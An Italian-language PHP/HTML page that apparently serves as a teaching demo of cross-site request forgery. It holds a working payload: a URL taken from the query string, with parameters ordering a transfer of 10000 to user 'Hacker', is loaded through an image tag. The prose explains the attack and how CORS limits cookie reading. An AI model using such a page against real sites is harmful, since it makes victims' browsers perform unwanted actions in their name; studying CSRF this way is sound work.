<?php
	$siteToHack = $_GET['attackTo'];
	if(!$siteToHack){
		throw new Exception("Error missing attackTo in query string GET request", 1);
	}
	$siteToHack .= '?username=Hacker&sumToTransfer=10000';
?>

<!DOCTYPE>
<!DOCTYPE html>
<html>
<head>
	<title>hahahackedyou!!!</title>
</head>
<style>
	body{
		background-color: rgba(150,70,10,0.5);
		margin: 1em auto 2em;
		max-width: 800px;
		text-align: justify;
		padding: 0 1em;
	}
	h1{
		display: block;
		border-bottom: 2px solid purple;
	}
	xmp{
		background-color: rgba(150,70,10,0.5);
	}
	p {
		margin-top: 1em;
	}
	img{
		display:block;
		margin: 2em auto;
	}
</style>
<body>



<h1>Haha I've Hacked you GUY!</h1>
<p>
	Come da copione, questo rappresenta un host sul quale ci si puo' imbattere navigando a random per internet. La malignita' sta' nel suo tentativo di svolgere una CSFR che puo' avvenire in vari modi.
</p>




<h1>CSFR via IMG</h1>
<p>
	 Tramite hack del tag immagine di cui sotto:
	<script>
		function trackMe(a,b,c){
			console.warn('TrackMe:')
			console.log(this)
			console.log(a)
		}
	</script>
	<xmp>
		<img src="<?php echo $siteToHack; ?>"/>
	</xmp>
	
	<img src="<?php echo $siteToHack; ?>"/>

	Un sito fraudolento magari proverebbe a svolgere questa operazione con dei siti a caso, ma per semplicita' ho impostato il sito da attaccare nella query string URL, che in questo caso risulta essere il sito chiamante, ovvero
	<b>
		<?php echo $siteToHack; ?>		
	</b>. Guardando la `request-header` di questo tag, posso notare che i cookie "rubati" vengono aggiunti alla richiesta, pertanto se l'host che voglio attaccare usa i cookie per validare, pensera' che sia io a richiedere l'operazione. 
</p>
<p>
	Con questo metodo l'hacker non recupera direttamente i cookie, ma aggiunge alla richiesta dei parametri per far svolgere delle operaizioni come se fosse l'utente a cui ha rubato l'identita': in questo caso un versamento di 10000 all'utente Hacker.
</p>
<p>
	In alternativa si puo' anche utilizzare un `form` con submit automatico al load della pagina: la sostanza non cambia!
</p>




<h1>CSFR via XMLHttpRequest</h1>
<p>
	Per recuperare i cookie dalla chiamata svolta dal fake tag `img` non posso usare i `document.cookie`, che andrebbero a cercare i cookie impostati dalla chiamata a questa pagina (ovvero la richiesta get dell'utente che naviga in internet). Pero' nessuno mi vieta di svolgere una `XMLHttpRequest` catturando poi i response-headers.
	<br/>

	In Realta' anche provando una `XMLHttpRequest` vado incontro a due ostacoli:
	<ul>
		<li>
			Origin Allow Access Controll NON abilitato,<br/>
			in questo caso il problema e' che sto facendo una richiesta ad un sito esterno, pertanto se non ho l'autorizzazione da quel sito non posso recuperare alcun header, pertanto alcun cookie!!
		</li>
		<li>
			Origin Allow Access Controll *,<br/>
			in questo caso la chiamata avviene con successo, ma sempre per motivi di sicurezza il browser mi permette di recuperare SOLO gli header sicuri: naturalmente i `Set-Cookie` non ne fanno parte, sigh!
		</li>
	</ul>
</p>

<h1>Riassumendo</h1>
<p>
	Pur non essendomi spaccato la testa a cercare una soluzione, quello che noto e' che con CSFR non posso recuperare direttamente i cookies. Un hacker pero' non si scoraggerebbe, in quanto:
	<ol>
	 	<li>
	 		mediante inspect html del sito esterno e controllo delle chiamate (agendo come normale utente), posso acquisire informazioni su come impacchettare richieste e form.
	 	</li>
	 	<li>
	 		una volta ottenuti gli schemi dal punto precedente, mediante `img` e `form` posso svolgere operazioni sul sito esterno spacciandomi per l'utente che ho hackerato
	 	</li>
	 </ol>

	 grazie a questi due punti non ho bisogno di venire a conoscienza diretta dei cookie per il login, in quanto mi posso spacciare direttamente per l'utente senza bisogno di interagire direttamente con la pagina del sito esterno logandomi come tale utente!
</p>


<script type="text/javascript">
	var links = document.querySelectorAll('a[href]');
	for(var i in links){
		var el = links[i];
		if(el.setAttribute) el.setAttribute("target","_blank");
	}
</script>

</body>
</html>